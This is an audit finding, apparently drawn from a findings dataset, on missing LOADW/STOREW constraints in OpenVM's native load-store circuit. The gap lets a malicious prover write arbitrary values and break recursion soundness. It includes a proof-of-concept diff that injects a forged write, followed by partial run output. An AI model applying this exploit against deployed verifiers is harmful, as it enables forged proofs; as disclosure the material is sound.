# [H] Missing constraints in LOADW and STOREW

## Summary
Severity: High
Reporter: georg
Contest weight: 0.5175
Dataset id: 4880
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The NativeLoadStoreCoreAir::eval function does not constraint anything except
the values of the instruction flags given the opcode.
In particular, there is no constraint between
cols.data_read and cols.data_write.
Also, the NativeLoadStoreAdapterAir does not enforce any
constraint between ctx.reads.1 and ctx.writes.

Impact Explanation:
This lets a malicious prover write any value for any LOADW or STOREW instructions
during the execution of the recursive verifier. This breaks soundness of the recursion VM.

## Proof of Concept
The following patch adds a dummy instruction to the recursive verifier program (to
keep the changes to witness generation self-contained), and then exploits it. In particular, the instruction
should read from address (111111) (which in the beginning of the program has value 0) and write it to the
same address. Instead, it writes a different value.
diff --git a/crates/sdk/src/verifier/leaf/mod.rs b/crates/sdk/src/verifier/leaf/mod.rs
index 969733ba4..532eb8129 100644
--- a/crates/sdk/src/verifier/leaf/mod.rs
+++ b/crates/sdk/src/verifier/leaf/mod.rs
@@ -14,6 +14,7 @@ use openvm_stark_sdk::{
keygen::types::MultiStarkVerifyingKey, p3_field::FieldAlgebra, p3_util::log2_strict_usize,
proof::Proof,
},
+
p3_baby_bear::BabyBear,
};
use crate::{
@@ -102,7 +103,29 @@ impl LeafVmVerifierConfig {
builder.halt();
}
-
builder.compile_isa_with_options(self.compiler_options)
+
let result = builder.compile_isa_with_options(self.compiler_options);
+
// Copy the first instruction and overwrite its values to create
+
// a dummy instruction that has no effect on the rest of the program,
+
// but for which we'll demonstrate the exploit.
+
let mut dummy_instruction = result.instructions_and_debug_infos[0].clone();
+
let instruction = &mut dummy_instruction.as_mut().unwrap().0;
+
// Opcode 256 is LOADW
+
instruction.opcode.0 = 256;
+
// Read from address 111111, write to address 111111
+
instruction.a = BabyBear::from_canonical_u32(111111);
+
instruction.b = BabyBear::from_canonical_u32(0);
+
instruction.c = BabyBear::from_canonical_u32(111111);
+
instruction.d = BabyBear::from_canonical_u32(4);
+
instruction.e = BabyBear::from_canonical_u32(4);
+
instruction.f = BabyBear::from_canonical_u32(0);
+
instruction.g = BabyBear::from_canonical_u32(0);
+
println!("Dummy instruction: {:?}", dummy_instruction);
+
Program {
+
instructions_and_debug_infos: std::iter::once(dummy_instruction)
+
.chain(result.instructions_and_debug_infos)
+
.collect(),
+
..result
+
}
}
/// Read the public values root proof from the input stream and verify it.

diff --git a/crates/toolchain/instructions/src/lib.rs b/crates/toolchain/instructions/src/lib.rs
index 961882446..5858b7eea 100644
--- a/crates/toolchain/instructions/src/lib.rs
+++ b/crates/toolchain/instructions/src/lib.rs
@@ -30,7 +30,7 @@ pub trait LocalOpcode {
}
#[derive(Copy, Clone, Debug, Hash, PartialEq, Eq, derive_new::new, Serialize, Deserialize)]
-pub struct VmOpcode(usize);
+pub struct VmOpcode(pub usize);
impl VmOpcode {
/// Returns the corresponding `local_opcode_idx`
diff --git a/extensions/native/circuit/src/loadstore/core.rs b/extensions/native/circuit/src/loadstore/core.rs
index f79bbc5fb..b799ccfe6 100644
--- a/extensions/native/circuit/src/loadstore/core.rs
+++ b/extensions/native/circuit/src/loadstore/core.rs
@@ -166,8 +166,19 @@ where
}
array::from_fn(|_| streams.hint_stream.pop_front().unwrap())
} else {
-
data_read
+
if from_pc == 0 {
+
println!("Changing data_write");
+
array::from_fn(|_| F::from_canonical_u32(12345))
+
} else {
+
data_read
+
}
};
+
if from_pc == 0 {
+
println!(
+
"{:?} (PC {}): Reading {:?}, Writing {:?}",
+
local_opcode, from_pc, data_read, data_write
+
);
+
}
let output = AdapterRuntimeContext::without_pc(data_write);
let record = NativeLoadStoreCoreRecord {
Running the onchain verification steps on the Fibonacci example (we used input 0xF000000000000000)
prints the following:
...
fibonacci:
Finished `release` profile [optimized] target(s) in 0.06s
[openvm] Transpiling the package...
"./openvm.toml" not found, using default application configuration
[openvm] Successfully transpiled to ./openvm/app.vmexe
"./openvm.toml" not found, using default application configuration

## Recommendation
Since cols.data_read and cols.data_write should always be equal, they could in
fact be the same columns.
